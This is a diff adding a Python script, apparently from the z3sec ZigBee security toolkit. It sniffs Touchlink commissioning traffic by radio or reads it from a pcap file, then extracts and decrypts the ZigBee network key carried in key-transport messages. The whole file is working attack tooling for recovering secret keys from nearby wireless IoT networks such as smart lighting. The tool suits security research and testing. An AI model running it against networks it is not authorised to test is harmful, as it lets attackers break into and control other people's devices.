@@ -1,0 +1,101 @@
+#!/usr/bin/env python
+
+import sys
+import argparse
+
+# suppress annoying Scapy IPv6 warning:
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+# from killerbee import *
+from killerbee.scapy_extensions import kbrdpcap
+# from scapy.all import *
+from scapy.layers.dot15d4 import *
+
+from z3sec import radios
+from z3sec import arg_type
+from z3sec import touchlink_crypt
+
+del hexdump
+from scapy.utils import hexdump
+
+TOUCHLINK_SCAN_RESPONSES = []
+SUCCESS = False
+
+def handle_packets(pkt):
+    global TOUCHLINK_SCAN_RESPONSES
+    global SUCCESS
+
+    if touchlink_crypt.is_scan_response(pkt):
+        TOUCHLINK_SCAN_RESPONSES.append(pkt)
+        print("Collected Scan Response")
+        return
+    if touchlink_crypt.is_keytransport(pkt):
+        # print("Key transport detected.")
+        response_id = touchlink_crypt.get_response_id(pkt,
+                TOUCHLINK_SCAN_RESPONSES)
+        if response_id is None:
+            print("Could not find corresponding response_id in the packets we "
+                    "collected so far. Decryption of network key not possible.")
+            return
+        network_key = touchlink_crypt.extract_network_key(pkt, response_id)
+        print("")
+        print(">>> Pan_id: {}".format(pkt.sprintf("%Dot15d4Data.src_panid%")))
+        if network_key is not None:
+            print(">>> Network key: {}" \
+                .format(network_key.encode('hex')))
+            print("")
+            SUCCESS = True
+        else:
+            print(">>> Network key: undecryptable")
+
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description="Extract and decrypt the "
+            "network key being transmitted during a touchlink key transport. "
+            "Either use a radio (--kb or --sdr) or a pcap-file (--pcap) as "
+            "traffic source.")
+    parser.add_argument('-c', '--channel', default=11, type=arg_type.channel,
+            help="Set the channel to operate on (11 - 26).")
+    source_group = parser.add_mutually_exclusive_group(required=True)
+    source_group.add_argument('-p', '--pcap', type=str, default=None,
+            help="Path to pcap-file containing touchlink traffic.")
+    source_group.add_argument("--kb", type=arg_type.kb_dev,
+            help="Use a KillerBee compatible radio device. It is required to "
+                "pass the device string of the radio (e.g. '/dev/ttyUSB0'). "
+                "The device string can be retrieved with the 'zbid' command. ")
+    source_group.add_argument("--sdr", action="store_true",
+            help="Use a GNU Radio / USRP radio device.")
+    args = parser.parse_args()
+
+    if args.pcap is not None:
+        pcap = kbrdpcap(args.pcap)
+        for (i, p) in enumerate(pcap):
+            handle_packets(p)
+        if not SUCCESS:
+            print("The pcap-file did not contain a complete touchlink "
+            "key transport or an unknown master key was used to encrypt "
+            "network key.")
+    elif args.sdr is not None or args.kb is not None:
+        radio = None
+        if args.sdr:
+            radio=radios.GnuRadio()
+        if args.kb is not None:
+            radio = radios.KillerbeeRadio(args.kb)
+        radio.set_channel(args.channel)
+        radio.sniffer_on()
+        print("Sniffing for Touchlink key transports on channel {}..."
+            .format(args.channel))
+        print("Press Ctrl+c to exit.")
+        try:
+            while True:
+                recvpkt, info = radio.recv()
+                if recvpkt != None:
+                    # print(pkt.summary())
+                    handle_packets(recvpkt)
+            radio.close()
+        except KeyboardInterrupt:
+            radio.close()
+            sys.exit(0)
+    else:
+        print("No source for packets specified (--kb, --sdr, --pcap). Nothing to do.")
